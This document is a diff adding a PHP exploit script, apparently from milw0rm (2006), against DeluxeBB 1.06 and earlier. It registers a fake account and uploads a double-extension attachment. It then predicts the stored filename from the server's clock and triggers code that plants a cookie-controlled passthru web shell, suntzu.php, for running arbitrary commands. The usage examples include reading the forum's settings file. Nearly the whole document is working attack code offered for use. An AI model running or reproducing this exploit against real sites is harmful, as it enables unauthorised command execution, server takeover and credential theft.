@@ -1,0 +1,317 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "DeluxeBB <= v1.06 attachment mod_mime exploit\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n";
+echo "tested & working against a fresh deluxebb installation\r\n\r\n";
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to deluxebb\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /deluxebb/ cat ./../settings/info.php\r\n";
+echo "php ".$argv[0]." localhost /deluxebb/ ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n\r\n";
+die;
+}
+
+/*explaination:
+
+  you can upload attachments with double extensions, ex.:
+
+  test.php.php.rar
+
+  file is renamed like this:
+
+  test.php.php-1147772503.ext
+
+  and copied to the files/ folder, as you can see, new filename is predictable...,
+  numbers are the result of time() php function, you have just to synchronize
+  clocks through Apache "Date" header...
+
+  It seems that Apache mod_mime module considers double-extension files like
+  this to be valid PHP files and runs the arbitrary code that has been uploaded,
+  actually on most versions you can do somethign like this:
+
+  http://[target]/[path]/files/test.php.php-1147772503.ext?cmd=ls%20-la
+                                 */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+   $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+   }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+function greenwich_timestamp($response)
+{
+   $temp=explode("Date: ",$response);
+   $temp2=explode("\r\n",$temp[1]);
+   $is_now=$temp2[0];
+   $temp=explode(" ",$is_now);$day=$temp[1];$month=$temp[2];$year=$temp[3];$temp2=explode(":",$temp[4]);
+   $hour=$temp2[0];$min=$temp2[1];$sec=$temp2[2];
+   $tb=array ('Jan', '1','Feb', '2','Mar', '3','Apr', '4','May', '5','Jun', '6',
+   'Jul', '7','Aug', '8','Sep', '9','Oct', '10','Nov', '11','Dec', '12');
+   for ($i=0;$i<=23;$i++) {if ($month==$tb[$i]) {$month=$tb[$i+1];break;}}
+   return mktime($hour,$min,$sec,$month,$day,$year);
+}
+
+function gmtime() {    // Get GM offset.
+   return time() - (int) date('Z');
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";$port=80;$proxy="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "step 0 -> Check if suntzu.php is already installed\r\n";
+$packet ="GET ".$p."files/suntzu.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"56789"))
+{
+    echo "Exploit succeeded...";
+    $temp=explode("56789",$html);
+    die("\r\n".$temp[1]."\r\n");
+}
+
+echo "step 0b -> Synchronize...\r\n";
+$difftime=0;
+//Unin epoch time by Apache "Date:" response header
+//it carries GMT time... sending HEAD request
+$packet ="HEAD / HTTP/1.1\r\nHost: ".$host."\r\nConnection: Close\r\n\r\n";
+sendpacketii($packet);
+if ((eregi("Date: ",$html)) and ($proxy==''))
+{
+$itstime=greenwich_timestamp($html);
+echo "target host Greenwich timestamp: ".$itstime."\r\n";
+$mytime=gmtime();
+echo "my greenwich timestamp: ".$mytime."\r\n";
+$difftime= $itstime-$mytime;
+echo "difftime: ".$difftime."\r\n";
+}
+else
+{
+echo "Unable to read \"Date\", assuming difftime = 0\r\n";
+}
+
+echo "step 1 -> Register...\r\n";
+srand(make_seed());
+$anumber = rand(1,99999);
+$data="name=suntzu".$anumber;
+$data.="&pass=suntzu";
+$data.="&pass2=suntzu";
+$data.="&email=suntzu".$anumber."%40fakemail.com";
+$data.="&hideemail=1";
+$data.="&languagex=English";
+$data.="&xthetimeoffset=2";
+$data.="&xthedateformat=d-m-Y";
+$data.="&xthetimeformat=24";
+$data.="&submit=Register";
+$packet ="POST ".$p."misc.php?sub=register HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$cookie="";
+for ($i=1; $i<=count($temp)-1; $i++)
+{
+$temp2=explode(" ",$temp[$i]);
+$cookie.=" ".$temp2[0];
+}
+if ($cookie=='') {
+         die("Unable to register...");
+    }
+else {
+         echo "cookie -> ".$cookie."\r\n";
+         }
+
+echo "step 2 -> Post a new thread with the evil attachment...\r\n";
+
+$attachment='
+<?php
+$fp=fopen("suntzu.php","w");
+fputs($fp,"<?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\$_COOKIE[cmd]=stripslashes(\$_COOKIE[cmd]);}echo 56789;passthru(\$_COOKIE[cmd]);echo 56789;?>");
+fclose($fp);
+chmod("suntzu.php",777);
+?>';
+
+$data='-----------------------------7d6ee3a7074a
+Content-Disposition: form-data; name="subject"
+
+Sun-Tzu, Art of War
+-----------------------------7d6ee3a7074a
+Content-Disposition: form-data; name="posticon"
+
+None
+-----------------------------7d6ee3a7074a
+Content-Disposition: form-data; name="disablesmilies"
+
+1
+-----------------------------7d6ee3a7074a
+Content-Disposition: form-data; name="fileupload"; filename="suntzu'.$anumber.'.php.php.rar"
+Content-Type: application/octet-stream
+
+'.$attachment.'
+-----------------------------7d6ee3a7074a
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1048576
+-----------------------------7d6ee3a7074a
+Content-Disposition: form-data; name="what"
+
+ciao
+-----------------------------7d6ee3a7074a
+Content-Disposition: form-data; name="submit"
+
+Post
+-----------------------------7d6ee3a7074a--
+';
+
+$packet ="POST ".$p."newpost.php?sub=newthread&fid=1 HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6ee3a7074a\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+$mytime=time() + $difftime;
+sendpacketii($packet);
+sleep(2);
+
+/*
+file is renamed in this way:
+
+...
+$time = time(); //header.php, line 78
+...
+
+...
+$saveit = $settings['attachdir'] . $filename . '-' . $time . '.' . 'ext'; //newpost.php, line 218-219
+copy($fileupload['tmp_name'], $saveit);
+...                                 */
+
+$predict_time=
+            array (
+             $mytime,
+             $mytime + 1,
+             $mytime + 2,
+             $mytime + 3,
+             $mytime + 4,
+             $mytime + 5,
+             $mytime + 6
+             );
+
+for ($i=0; $i<=count($predict_time)-1; $i++)
+{
+  $a=3+$i;
+  echo "step ".$a." -> trying with suntzu".$anumber.".php.php-".$predict_time[$i].".ext\r\n";
+  $packet ="GET ".$p."files/suntzu".$anumber.".php.php-".$predict_time[$i].".ext HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  sendpacketii($packet);
+
+  $packet ="GET ".$p."files/suntzu.php HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Cookie: cmd=".$cmd.";\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  sendpacketii($packet);
+  if (strstr($html,"56789"))
+  {
+    echo "Exploit succeeded...";
+    $temp=explode("56789",$html);
+    die("\r\n".$temp[1]."\r\n");
+  }
+}
+//if you are here...
+echo "Exploit failed...";
+?>
+
+# milw0rm.com [2006-05-16]
